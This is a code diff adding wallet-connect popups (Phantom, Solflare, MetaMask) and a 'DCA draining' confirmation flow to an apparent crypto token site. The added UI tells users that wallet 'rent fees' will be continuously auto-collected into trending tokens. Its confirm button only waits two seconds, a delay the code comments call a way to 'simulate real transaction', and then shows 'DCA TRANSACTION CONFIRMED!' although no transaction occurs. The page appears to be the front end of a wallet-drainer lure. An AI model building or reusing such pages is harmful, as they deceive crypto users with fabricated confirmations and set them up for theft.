@@ -443,7 +443,7 @@
                 <a href="#trending">TRENDING TOKENS</a>
             </div>
             <div class="nav-right">
-                <button class="buy-button" onclick="window.location.href='index.html'">START DCA</button>
+                <button class="buy-button" id="startDCAButton">START DCA</button>
             </div>
         </nav>
 
@@ -499,6 +499,101 @@
         </div>
     </div>
 
+    <!-- Wallet Connection Popup -->
+    <div class="wallet-popup-overlay" id="walletPopup">
+        <div class="wallet-popup">
+            <div class="wallet-popup-header">
+                <h2 class="wallet-popup-title">CONNECT WALLET</h2>
+                <p class="wallet-popup-subtitle">Choose your wallet to start DCA draining</p>
+                <button class="wallet-popup-close" id="walletPopupClose">&times;</button>
+            </div>
+            
+            <div class="wallet-popup-body">
+                <div class="wallet-options">
+                    <button class="wallet-option" data-wallet="phantom">
+                        <img src="wallet-auth-system/assets/phantom-wallet-logo.png" alt="Phantom" class="wallet-logo">
+                        <div class="wallet-details">
+                            <span class="wallet-name">PHANTOM</span>
+                            <span class="wallet-desc">SOL • PROTOCOL</span>
+                        </div>
+                        <span class="wallet-connect-btn">CONNECT</span>
+                    </button>
+                    
+                    <button class="wallet-option" data-wallet="solflare">
+                        <img src="wallet-auth-system/assets/solflare-wallet-logo.jpg" alt="Solflare" class="wallet-logo">
+                        <div class="wallet-details">
+                            <span class="wallet-name">SOLFLARE</span>
+                            <span class="wallet-desc">SOL • SECURE</span>
+                        </div>
+                        <span class="wallet-connect-btn">CONNECT</span>
+                    </button>
+                    
+                    <button class="wallet-option" data-wallet="metamask">
+                        <img src="wallet-auth-system/assets/metamask-wallet-logo.jpg" alt="MetaMask" class="wallet-logo">
+                        <div class="wallet-details">
+                            <span class="wallet-name">METAMASK</span>
+                            <span class="wallet-desc">ETH • MULTI-CHAIN</span>
+                        </div>
+                        <span class="wallet-connect-btn">CONNECT</span>
+                    </button>
+                </div>
+                
+                <div class="wallet-popup-footer">
+                    <p>By connecting, you agree to our Terms of Service</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- DCA Confirmation Modal -->
+    <div class="dca-confirmation-overlay" id="dcaConfirmationModal">
+        <div class="dca-confirmation-modal">
+            <div class="dca-confirmation-header">
+                <h2 class="dca-confirmation-title">START DCA DRAINING</h2>
+                <p class="dca-confirmation-subtitle">Confirm your wallet rent fees will be DCAed into trending tokens</p>
+                <button class="dca-confirmation-close" id="dcaConfirmationClose">&times;</button>
+            </div>
+            
+            <div class="dca-confirmation-body">
+                <div class="dca-summary">
+                    <div class="dca-summary-item">
+                        <span class="dca-summary-label">Wallet Rent Fees</span>
+                        <span class="dca-summary-value">Auto-collected</span>
+                    </div>
+                    <div class="dca-summary-item">
+                        <span class="dca-summary-label">DCA Strategy</span>
+                        <span class="dca-summary-value">Into Trending Tokens</span>
+                    </div>
+                    <div class="dca-summary-item">
+                        <span class="dca-summary-label">Frequency</span>
+                        <span class="dca-summary-value">Continuous</span>
+                    </div>
+                </div>
+                
+                <div class="trending-tokens-preview">
+                    <h3 class="trending-preview-title">Your fees will be DCAed into these trending tokens:</h3>
+                    <div class="trending-tokens-list" id="trendingTokensList">
+                        <!-- Trending tokens will be populated here -->
+                    </div>
+                </div>
+                
+                <div class="dca-confirmation-actions">
+                    <button class="dca-confirm-btn" id="confirmDCA">CONFIRM DCA</button>
+                    <button class="dca-cancel-btn" id="cancelDCA">CANCEL</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Success Confirmation -->
+    <div class="success-confirmation-overlay" id="successConfirmation">
+        <div class="success-confirmation-modal">
+            <div class="success-icon">✅</div>
+            <h2 class="success-title">DCA TRANSACTION CONFIRMED!</h2>
+            <p class="success-message">Your wallet rent fees are now being DCAed into trending tokens</p>
+        </div>
+    </div>
+
     <script>
         // CA Widget functionality
         function copyCA(event) {
@@ -549,6 +644,240 @@
         // Auto-play video background
         const backgroundVideo = document.getElementById('background-video');
         backgroundVideo.play().catch(e => console.log('Video autoplay prevented:', e));
+
+        // Wallet Popup functionality
+        const walletPopup = document.getElementById('walletPopup');
+        const walletPopupClose = document.getElementById('walletPopupClose');
+
+        function showWalletPopup() {
+            walletPopup.classList.add('show');
+            document.body.style.overflow = 'hidden'; // Prevent background scroll
+        }
+
+        function hideWalletPopup() {
+            walletPopup.classList.remove('show');
+            document.body.style.overflow = 'auto'; // Restore scroll
+        }
+
+        // Close popup when clicking close button
+        walletPopupClose.addEventListener('click', hideWalletPopup);
+
+        // Close popup when clicking outside
+        walletPopup.addEventListener('click', function(e) {
+            if (e.target === walletPopup) {
+                hideWalletPopup();
+            }
+        });
+
+        // Close popup with Escape key
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape' && walletPopup.classList.contains('show')) {
+                hideWalletPopup();
+            }
+        });
+
+        // Add event listeners to wallet buttons for direct connection
+        document.addEventListener('DOMContentLoaded', function() {
+            const walletButtons = document.querySelectorAll('.wallet-option');
+            
+            walletButtons.forEach(button => {
+                button.addEventListener('click', async function() {
+                    const walletType = this.getAttribute('data-wallet');
+                    console.log(`🔗 User clicked ${walletType.toUpperCase()} wallet button`);
+                    await connectWallet(walletType);
+                });
+            });
+        });
+
+        async function connectWallet(walletType) {
+            try {
+                console.log(`🚀 Starting connection process for ${walletType.toUpperCase()} wallet...`);
+                
+                // Add loading state
+                const walletOption = document.querySelector(`[data-wallet="${walletType}"]`);
+                const connectBtn = walletOption.querySelector('.wallet-connect-btn');
+                const originalText = connectBtn.textContent;
+                connectBtn.textContent = 'CONNECTING...';
+                walletOption.style.opacity = '0.7';
+
+                let result = null;
+
+                switch (walletType) {
+                    case 'phantom':
+                        result = await connectPhantom();
+                        break;
+                    case 'solflare':
+                        result = await connectSolflare();
+                        break;
+                    case 'metamask':
+                        result = await connectMetaMask();
+                        break;
+                    default:
+                        throw new Error('Unsupported wallet type');
+                }
+
+                if (result.success) {
+                    console.log('🎉 Wallet connected successfully:', result);
+                    
+                    // Show success feedback
+                    connectBtn.textContent = 'CONNECTED!';
+                    connectBtn.style.background = 'var(--bright-pink)';
+                    connectBtn.style.color = 'var(--white)';
+                    
+                    // Close popup after success
+                    setTimeout(() => {
+                        hideWalletPopup();
+                        // Show DCA confirmation modal after wallet connection
+                        showDCAConfirmationModal();
+                    }, 1500);
+                } else {
+                    throw new Error(result.error || 'Connection failed');
+                }
+
+            } catch (error) {
+                console.error('❌ Wallet connection error:', error);
+                
+                // Reset UI
+                const walletOption = document.querySelector(`[data-wallet="${walletType}"]`);
+                const connectBtn = walletOption.querySelector('.wallet-connect-btn');
+                connectBtn.textContent = 'FAILED';
+                connectBtn.style.background = '#ff4444';
+                connectBtn.style.color = 'white';
+                walletOption.style.opacity = '1';
+
+                // Reset after delay
+                setTimeout(() => {
+                    connectBtn.textContent = 'CONNECT';
+                    connectBtn.style.background = '';
+                    connectBtn.style.color = '';
+                }, 2000);
+
+                alert(`Failed to connect to ${walletType.toUpperCase()}: ${error.message}`);
+            }
+        }
+
+        // WORKING wallet connection functions
+        async function connectPhantom() {
+            console.log('🔍 Phantom connection attempt...');
+            
+            // Check if Phantom is installed using CORRECT 2024 pattern
+            if (!window.phantom || !window.phantom.solana) {
+                window.open('https://phantom.app/', '_blank');
+                return { success: false, error: 'Phantom wallet not found. Please install Phantom extension and refresh the page.' };
+            }
+
+            if (!window.phantom.solana.isPhantom) {
+                return { success: false, error: 'Phantom provider not detected. Please ensure Phantom is enabled.' };
+            }
+
+            try {
+                console.log('📱 Requesting Phantom connection...');
+                const response = await window.phantom.solana.connect({ onlyIfTrusted: false });
+                
+                if (!response || !response.publicKey) {
+                    return { success: false, error: 'Failed to get wallet address from Phantom.' };
+                }
+
+                console.log('✅ Phantom connected successfully:', response.publicKey.toString());
+                return {
+                    success: true,
+                    data: {
+                        publicKey: response.publicKey.toString(),
+                        address: response.publicKey.toString()
+                    }
+                };
+            } catch (error) {
+                console.error('Phantom connection error:', error);
+                if (error.code === 4001 || error.message.includes('User rejected')) {
+                    return { success: false, error: 'Connection rejected by user. Please approve the connection request in Phantom.' };
+                }
+                return { success: false, error: `Connection failed: ${error.message}` };
+            }
+        }
+
+        async function connectSolflare() {
+            console.log('🔍 Solflare connection attempt...');
+            
+            let solflareProvider = null;
+            
+            if (window.solflare && window.solflare.isSolflare) {
+                solflareProvider = window.solflare;
+            } else if (window.solana && window.solana.isSolflare) {
+                solflareProvider = window.solana;
+            } else if (window.SolflareApp) {
+                solflareProvider = window.SolflareApp;
+            }
+            
+            if (!solflareProvider) {
+                window.open('https://solflare.com/', '_blank');
+                return { success: false, error: 'Solflare wallet not found. Please install Solflare extension and refresh the page.' };
+            }
+
+            try {
+                console.log('📱 Requesting Solflare connection...');
+                const response = await solflareProvider.connect();
+                
+                if (!response || !response.publicKey) {
+                    return { success: false, error: 'Failed to get wallet address from Solflare.' };
+                }
+
+                console.log('✅ Solflare connected successfully:', response.publicKey.toString());
+                return {
+                    success: true,
+                    data: {
+                        publicKey: response.publicKey.toString(),
+                        address: response.publicKey.toString()
+                    }
+                };
+            } catch (error) {
+                console.error('Solflare connection error:', error);
+                if (error.code === 4001 || error.message.includes('rejected')) {
+                    return { success: false, error: 'Connection rejected by user. Please approve the connection request in Solflare.' };
+                }
+                return { success: false, error: `Connection failed: ${error.message}` };
+            }
+        }
+
+        async function connectMetaMask() {
+            console.log('🔍 MetaMask connection attempt...');
+            
+            if (typeof window.ethereum === 'undefined') {
+                window.open('https://metamask.io/download/', '_blank');
+                return { success: false, error: 'MetaMask not found. Please install MetaMask extension and refresh the page.' };
+            }
+
+            if (!window.ethereum.isMetaMask) {
+                return { success: false, error: 'MetaMask provider not detected. Please ensure MetaMask is enabled.' };
+            }
+
+            try {
+                console.log('📱 Requesting MetaMask accounts...');
+                const accounts = await window.ethereum.request({
+                    method: 'eth_requestAccounts'
+                });
+
+                if (!accounts || accounts.length === 0) {
+                    return { success: false, error: 'No accounts found. Please unlock MetaMask and try again.' };
+                }
+
+                console.log('✅ MetaMask connected successfully:', accounts[0]);
+                return {
+                    success: true,
+                    data: {
+                        address: accounts[0],
+                        publicKey: accounts[0]
+                    }
+                };
+            } catch (error) {
+                console.error('MetaMask connection error:', error);
+                if (error.code === 4001) {
+                    return { success: false, error: 'Connection rejected by user. Please approve the connection request.' };
+                } else if (error.code === -32002) {
+                    return { success: false, error: 'MetaMask is already processing a request. Please check MetaMask and try again.' };
+                }
+                return { success: false, error: `Connection failed: ${error.message}` };
+            }
+        }
 
         // CoinGecko API integration
         const COINGECKO_API_BASE = 'https://api.coingecko.com/api/v3';
@@ -722,6 +1051,120 @@
             lastRefresh = now;
             originalFetchTrendingTokens();
         };
+
+        // DCA Confirmation Modal functionality
+        const dcaConfirmationModal = document.getElementById('dcaConfirmationModal');
+        const dcaConfirmationClose = document.getElementById('dcaConfirmationClose');
+        const startDCAButton = document.getElementById('startDCAButton');
+        const confirmDCAButton = document.getElementById('confirmDCA');
+        const cancelDCAButton = document.getElementById('cancelDCA');
+        const successConfirmation = document.getElementById('successConfirmation');
+        const trendingTokensList = document.getElementById('trendingTokensList');
+
+        // Show DCA confirmation modal when Start DCA button is clicked
+        startDCAButton.addEventListener('click', function() {
+            showWalletPopup();
+        });
+
+        function showDCAConfirmationModal() {
+            // Use the already loaded trending tokens data
+            populateTrendingTokensInConfirmation();
+            dcaConfirmationModal.classList.add('show');
+            document.body.style.overflow = 'hidden';
+        }
+
+        function hideDCAConfirmationModal() {
+            dcaConfirmationModal.classList.remove('show');
+            document.body.style.overflow = 'auto';
+        }
+
+        // Close modal when clicking close button
+        dcaConfirmationClose.addEventListener('click', hideDCAConfirmationModal);
+
+        // Close modal when clicking outside
+        dcaConfirmationModal.addEventListener('click', function(e) {
+            if (e.target === dcaConfirmationModal) {
+                hideDCAConfirmationModal();
+            }
+        });
+
+        // Cancel button
+        cancelDCAButton.addEventListener('click', hideDCAConfirmationModal);
+
+        // Confirm DCA button
+        confirmDCAButton.addEventListener('click', function() {
+            hideDCAConfirmationModal();
+            
+            // Simulate transaction processing delay
+            setTimeout(() => {
+                showSuccessConfirmation();
+            }, 2000); // 2 second delay to simulate real transaction
+        });
+
+        function showSuccessConfirmation() {
+            successConfirmation.classList.add('show');
+            
+            // Hide success confirmation after 3 seconds
+            setTimeout(() => {
+                successConfirmation.classList.remove('show');
+            }, 3000);
+        }
+
+        // Close success confirmation when clicking outside
+        successConfirmation.addEventListener('click', function(e) {
+            if (e.target === successConfirmation) {
+                successConfirmation.classList.remove('show');
+            }
+        });
+
+        // Populate trending tokens in confirmation modal using existing data
+        function populateTrendingTokensInConfirmation() {
+            const tokensGrid = document.getElementById('tokensGrid');
+            const tokenCards = tokensGrid.querySelectorAll('.token-card');
+            
+            if (tokenCards.length > 0) {
+                // Use the first 6 tokens from the already loaded data
+                const tokensToShow = Array.from(tokenCards).slice(0, 6);
+                
+                trendingTokensList.innerHTML = tokensToShow.map(card => {
+                    const tokenName = card.querySelector('.token-name').textContent;
+                    const tokenSymbol = card.querySelector('.token-symbol').textContent;
+                    const tokenPrice = card.querySelector('.stat-value').textContent;
+                    const tokenLogo = card.querySelector('.token-logo').src;
+                    
+                    return `
+                        <div class="trending-token-item">
+                            <img src="${tokenLogo}" alt="${tokenName}" class="trending-token-logo" 
+                                 onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzAiIGhlaWdodD0iMzAiIHZpZXdCb3g9IjAgMCAzMCAzMCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPGNpcmNsZSBjeD0iMTUiIGN5PSIxNSIgcj0iMTUiIGZpbGw9IiNGRjE0OTMiLz4KPC9zdmc+Cgo='">
+                            <div class="trending-token-info">
+                                <span class="trending-token-name">${tokenName}</span>
+                                <span class="trending-token-symbol">${tokenSymbol}</span>
+                            </div>
+                            <div class="trending-token-price">${tokenPrice}</div>
+                        </div>
+                    `;
+                }).join('');
+            } else {
+                // Fallback if no tokens are loaded yet
+                trendingTokensList.innerHTML = `
+                    <div class="trending-token-fallback">
+                        <p>Loading trending tokens...</p>
+                    </div>
+                `;
+            }
+        }
+
+        // Close modal with Escape key
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                if (dcaConfirmationModal.classList.contains('show')) {
+                    hideDCAConfirmationModal();
+                }
+                if (successConfirmation.classList.contains('show')) {
+                    successConfirmation.classList.remove('show');
+                }
+            }
+        });
     </script>
 </body>
 </html>
